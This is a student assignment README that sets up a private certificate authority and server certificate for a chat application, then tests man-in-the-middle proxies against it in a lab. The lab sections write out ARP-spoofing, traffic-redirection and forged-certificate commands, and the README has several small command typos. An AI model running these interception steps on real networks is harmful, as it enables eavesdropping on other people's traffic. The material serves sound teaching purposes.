Phase3_README

In this Phase, we use OpenSSL libraries to create our own Cert Authority, a private key and a self-signed root certificate, generate a key pair for server, create a CSR and have our own CA sign to produce a server certificate, basically performing server authentication via PKI. Server sends certificate to client before any DH key exchange happens.

## Prerequisites to Run

Run the following on server

```text
# 1. Create the CA (on the server for convenience)
openssl req -x509 -newkey rsa:4096 -keyout ca_key.pem -out ca_cert.pem \
    -sha256 -days 3650 -nodes -subj "/CN=MyChatCA"

# 2. Generate Server Key and CSR
openssl genrsa -out server_key.pem 4096
openssl req -new -key server_key.pem -out server.csr -subj "/CN=10.0.2.10"

# 3. Sign the Server Certificate using your CA
openssl x509 -req -in server.csr -CA ca_cert.pem -CAkey ca_key.pem \
    -CAcreateserial -out server_cert.pem -days 365 -sha256
```

Copy the ```text server_text.pem``` file to all the clients

*1. Basic Implementation*

### On Server
```text
cd Assignment1/server/Phase3/
g++ -std=c++17 server.cpp -o server -lssl -lcrypto #Ignore if ran already
./server
```
### On Clients
```text
cd Assignment1/client/Phase3/
scp wadiya@10.0.2.10:~/Assignment1/Phase3/server_cert.pem
g++ -std=c++17 client.cpp -o client -lssl -lcrypto #Ignore if ran already
./client
```
*2. Try Phase2 MiTM Proxy*

### On Server
```text
cd Assignment1/server/Phase3/
./server
```
### On one of the clients
```text
cd Assignment1/client/Phase3/
g++ -std=c++17 vuln_client.cpp -o vuln_client -lssl -lcrypto #Ignore if ran already
/client
```
### On Mallory Tamir
```text
cd Assignment1/Phase3/
g++ -std=c++17 mitm_proxy.cpp -o mitm_proxy -lssl -lcrypto #Ignore if ran already
/mitm_proxy
```

*3. Try MiTM Proxy with a fake certificate and ARP Spoofing*

### On Mallory Tamir

Run The Following on Different Terminals and keep them open

### *Terminal 1*
```text
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 9090 
```

### *Terminal 2*
```text
sudo arpspoof -i eth0 -t 10.0.2.10 10.0.2.20 
```

### *Terminal 3*
```text
sudo arpspoof -i eth0 -t 10.0.2.20 10.0.2.10 
```

### *Terminal 4*

```text
cd Assignment1/Phase3/
openssl genrsa -out fake_key.pem 2048
openssl req -new -x509 -key fake_key.pem -out fake_cert.pem -days 365 -subj "/C=US/ST=State/L=City/O=MalloryCorp/CN=10.0.2.10"
g++ -std=c++17 mitm_proxy_invalid_cert.cpp -o mitm_proxy_invalid_cert -lssl -lcrypto #Ignore if ran already
./mitm_proxy
```
### On Server
```text
cd Assignment1/server/Phase3/
./server
```
### On one of the clients
```text
cd Assignment1/client/Phase3/
g++ -std=c++17 client.cpp -o client -lssl -lcrypto #Ignore if ran already
./client
```

*4. Try MiTM Proxy with stolen certificate and ARP Spoofing*

### On Mallory Tamir

Run The Following on Different Terminals and keep them open (Ignore if already ran and is currently running based on previous attempts in Terminals 1,2 and 3)

### *Terminal 1*
```text
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 9090 
```

### *Terminal 2*
```text
sudo arpspoof -i eth0 -t 10.0.2.10 10.0.2.20 
```

### *Terminal 3*
```text
sudo arpspoof -i eth0 -t 10.0.2.20 10.0.2.10 
```

### *Terminal 4*

```text
cd Assignment1/Phase3/
scp wadiya@10.0.2.10:~/Assignment1/Phase3/server_cert.pem .
g++ -std=c++17 mitm_proxy_stolen_cert.cpp -o mitm_proxy_stolen_cert -lssl -lcrypto #Ignore if ran already
./mitm_proxy
```
### On Server
```text
cd Assignment1/server/Phase3/
./server
```
### On one of the clients
```text
cd Assignment1/client/Phase3/
g++ -std=c++17 client.cpp -o client -lssl -lcrypto #Ignore if ran already
./client
```
